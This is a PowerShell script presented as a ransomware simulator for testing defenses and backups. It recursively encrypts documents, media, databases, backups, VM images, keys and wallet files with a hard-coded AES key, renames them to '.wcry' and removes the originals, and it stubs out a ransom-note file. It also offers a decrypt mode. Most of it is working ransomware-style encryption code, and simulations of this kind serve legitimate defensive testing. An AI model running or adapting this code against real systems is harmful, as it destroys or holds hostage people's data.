<#
.SYNOPSIS
    Ransomware Simulator using AES to recursively encrypt or decrypt files at a given path
    Based on the lawndoc simulation - https://github.com/lawndoc/RanSim

.DESCRIPTION
    This script is intended to be used to test your defenses and backups against ransomware in a controlled environment. You can encrypt fake data for
    your simulation, but you also have the option to decrypt the files with the same script if you need to.

.EXAMPLE
    .\RansomSim.ps1 -Mode encrypt or .\RansomSim.ps1 -Mode decrypt

.INSTRUCTIONS
    Make sure to copy both files (RansomSim and FileCryptography) to the same folder 
    Change the TargetPath and the Extension
    Make sure the key is Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L=

    Run .\RansomSim.ps1 -mode encrypt -Key Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L= 
    Run .\RansomSim.ps1 -mode encrypt or decrypt
#>

##### ----------------------------------------------------------------------------------------------------------------------

# Define Parameters and Defaults
param([string]$Mode,
      [string]$TargetPath = "C:\temp",
      [string]$Extension = ".wcry",
      [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
)

# Define target file types

$TargetFiles = 
'*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.log','*.jpg','*.jpeg','*.png','*.gif', '*.avi','*.midi','*.mov','*.mp3','*.mp4',
'*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg', '*.docx*','*.mid*','*.wma*','*.flv*','*.mkv*','*.mov*','*.avi*','*.asf*','*.mpeg*','*.vob*','*.mpg*','*.wmv*','*.fla*',
'*.swf*','*.wav*','*.qcow2*','*.vdi*','*.vmdk*','*.vmx*','*.gpg*','*.aes*','*.ARC*','*.PAQ*','*.tar.bz2*','*.tbk*','*.bak*','*.tar*','*.tgz*','*.rar*','*.zip*','*.djv*',
'*.djvu*','*.svg*','*.bmp*','*.png*','*.gif*','*.raw*','*.cgm*','*.jpeg*','*.jpg*','*.tif*','*.tiff*','*.NEF*','*.psd*','*.cmd*','*.bat*','*.class','*.jar*','*.java*',
'*.asp*','*.brd*','*.sch*','*.dch*','*.dip*','*.vbs*','*.asm*','*.pas*','*.cpp*','*.php','*.ldf*','*.mdf*','*.ibd*','*.MYI*','*.MYD*','*.frm*','*.odb*','*.dbf','*.mdb*',
'*.sql*','*.SQLITEDB*','*.SQLITE3*','*.asc*','*.lay6*','*.lay*','*.ms11*','* .sldm*','*.sldx*','*.ppsm*','*.ppsx*','*.ppam*','*.docb*','*.mml*','*.sxm*','*.otg*','*.odg*',
'*.uop*','*.potx*','*.potm*','*.pptx*','*.pptm*','*.std*','*.sxd*','*.pot*','*.pps*','*.sti*','*.sxi*','*.otp*','*.odp*','*.wks*','*.xltx*','*.xltm*','*.xlsx','*.xlsm*',
'*.xlsb*','*.slk*','*.xlw*','*.xlt*','*.xlm*','*.xlc*','*.dif*','*.stc*','*.sxc*','*.ots*','*.ods*','*.hwp*','*.dotm*','*.dotx*','*.docm*','*.docx*','*.DOT*','*.max*',
'*.xml*','*.txt*','*.CSV*','*.uot*','*.RTF*','*.pdf*','*.XLS*','*.PPT*','*.stw*','*.sxw*','*.ott*','*.odt*','*.DOC*','*.pem*','*.csr*','*.crt*','*.key','*wallet.dat'

# Import FileCryptography Module
Import-Module "$PSScriptRoot\FileCryptography.psm1" # Change the Path for FileCryptography as need //

if ($mode -eq "encrypt") {

    # Gather all files from the target path and its subdirectories

    $FilesToEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | where { ! $_.PSIsContainer }
    $NumFiles = $FilesToEncrypt.length

    # Encrypt the files

    foreach ($file in $FilesToEncrypt)
    {
        Write-Host "Encrypting $file"
        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
    }
    Write-Host "Encrypted $NumFiles files." | Start-Sleep -Seconds 10
}

elseif ($mode -eq "decrypt") {
    
    # Gather all files from the target path and its subdirectories
    
    $FilestoDecrypt = get-childitem -path $TargetPath\* -Include *$Extension -Recurse -force | where { ! $_.PSIsContainer }

    # Encrypt the files
    
    foreach ($file in $FilestoDecrypt)
    {
        Write-Host "Decrypting $file"
        Unprotect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension  -RemoveSource
    }
} 

else {
    write-host "ERROR: must choose a mode (encrypt or decrypt). Example usage: .\RansomSim.ps1 -mode encrypt"
}
exit 

# Create _HELP_instructions.html File
New-Item -Path C:\temp\_HELP_instructions.html 

# Run the Ransomware Simulation
.\RansomSim.ps1 -Mode encrypt